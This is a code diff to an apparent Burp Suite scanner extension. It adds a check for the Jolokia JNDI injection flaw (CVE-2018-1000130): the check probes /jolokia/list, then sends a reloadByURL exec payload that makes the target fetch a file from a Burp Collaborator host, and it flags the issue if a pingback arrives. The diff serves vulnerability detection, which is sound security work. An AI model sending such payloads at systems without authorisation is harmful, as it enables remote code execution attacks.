@@ -212,6 +212,7 @@ class PerRequestScans(IScannerCheck):
             self.doCodePathScan,
             self.doStrutsScan,
             self.doShiroScan,
+            self.doJolokiaScan,
             self.doStruts_2017_9805_Scan,
             self.doStruts_2018_11776_Scan,
             self.doXXEPostScan,
@@ -220,6 +221,11 @@ class PerRequestScans(IScannerCheck):
 
     def doPassiveScan(self, basePair):
         return []
+
+    def fetchURL(self, basePair, url):
+        path = helpers.analyzeRequest(basePair).getUrl().getPath()
+        newReq = safe_bytes_to_string(basePair.getRequest()).replace(path, url, 1)
+        return callbacks.makeHttpRequest(basePair.getHttpService(), newReq)
 
     def doActiveScan(self, basePair, insertionPoint):
         if not self.should_trigger_per_request_attacks(basePair, insertionPoint):
@@ -316,6 +322,29 @@ class PerRequestScans(IScannerCheck):
 
         return []
 
+    # Based on https://blog.gdssecurity.com/labs/2018/4/18/jolokia-vulnerabilities-rce-xss.html
+    def doJolokiaScan(self, basePair):
+
+        payload = "/jolokia/list"
+        attack1 = self.fetchURL(basePair, payload)
+        if "reloadByURL" not in safe_bytes_to_string(attack1.getResponse()):
+            return []
+        global callbacks, helpers
+        collab = callbacks.createBurpCollaboratorClientContext()
+        collab_payload =collab.generatePayload(True)
+
+        obfuscated_payload = "/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/"+collab_payload+"!/example.xml"
+        #attack = request(basePair, obfuscated_payload)
+        debug_msg('put payload :\n\n' + obfuscated_payload + '\n')
+        attack = self.fetchURL(basePair, obfuscated_payload)
+        interactions = collab.fetchAllCollaboratorInteractions()
+        if interactions:
+            return [CustomScanIssue(attack.getHttpService(), helpers.analyzeRequest(attack).getUrl(), [attack],
+                                    'Jolokia RCE via JNDI Injection (CVE-2018-1000130)',
+                                    "The application appears to be running a version of Remote Code Execution via JNDI Injection vulnerable to Rce. ActiveScan++ sent a reference to an external file, and received a pingback from the server.<br/><br/>"+
+                                    "To investigate, use the manual collaborator client. It may be possible to escalate this vulnerability into RCE. Please refer to https://blog.gdssecurity.com/labs/2018/4/18/jolokia-vulnerabilities-rce-xss.html for further information",
+                                    'Firm', 'High')]
+        return []
 
 # Based on exploit at https://github.com/chrisjd20/cve-2017-9805.py
 # Tested against https://dev.northpolechristmastown.com/orders.xhtml (SANS Holiday Hack Challenge 2017)
